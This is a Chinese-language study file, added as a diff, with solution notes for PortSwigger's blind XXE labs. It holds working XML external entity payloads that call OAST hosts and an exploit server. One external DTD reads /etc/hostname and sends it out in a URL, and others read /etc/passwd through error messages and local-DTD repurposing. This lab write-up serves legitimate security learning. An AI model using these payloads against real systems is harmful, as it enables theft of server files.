@@ -1,0 +1,106 @@
+### XXE带外盲注 ###
+## 普通实体 ##
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
+注入点在库存检查功能
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+注入外部实体，并引用此实体
+盲注无需回显，于是此时也可创建新元素来引用外部实体
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dxe52iolc582exo0sc3o1irc53buzlna.oastify.com"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+## 参数实体 ##
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
+@ 参数实体使用%定义及引用，且只能在其他DTD内部被引用
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://bar"> %xxe; ]>
+@
+
+注入点在库存检查功能
+POST /product/stock HTTP/2
+响应为
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+注入并引用参数实体
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://qjdiovayyiuf0aadepp1nvdprgx7lz9o.oastify.com"> %xxe; ]>
+
+## 使用外部DTD参数实体获取数据 ##
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
+注入点在库存检查功能
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+控制服务器的文档类型定义DTD设置为：
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0afe00e303b18ed58051cbc201d70003.exploit-server.net/exploit/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+向目标服务器提交的内部DTD载荷为：
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://exploit-0afe00e303b18ed58051cbc201d70003.exploit-server.net/exploit"> %xxe;]>
+
+@# 尝试将外部DTD直接放入内部DTD中失败：
+动态声明可在外部DTD进行，而在内部DTD中被禁止。
+#@
+
+## 使用外部DTD引发错误消息检索数据 ##
+https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
+注入点在库存检查功能
+POST /product/stock HTTP/2
+响应为
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+控制服务器的文档类型定义DTD设置为：
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+向目标服务器提交的内部DTD载荷为：
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0af400ba0349b04880ed1bf9017a00bb.exploit-server.net/exploit"> %xxe;]>
+
+
+## 本地DTD盲注 ##
+https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
+# 找到本地DTD，使用引发错误的自定义实体覆盖其中包含的实体，加载此本地DTD #
+注入点在库存检查功能
+POST /product/stock HTTP/2
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+@
+使用 GNOME 桌面环境的系统通常在 /usr/share/yelp/dtd/docbookx.dtd 中包含一个 DTD，其中有一个名为 ISOamso 的实体。 
+@
+检查DTD文件是否存在
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+存在
+
+重定义本地DTD文件的实体并加载
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///foobaronexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+@
+% local_dtd 立即加载内容到作用域
+% ISOamso   攻击者定义的实体覆盖原实体
+%local_dtd  执行攻击者覆盖后的内容
+@
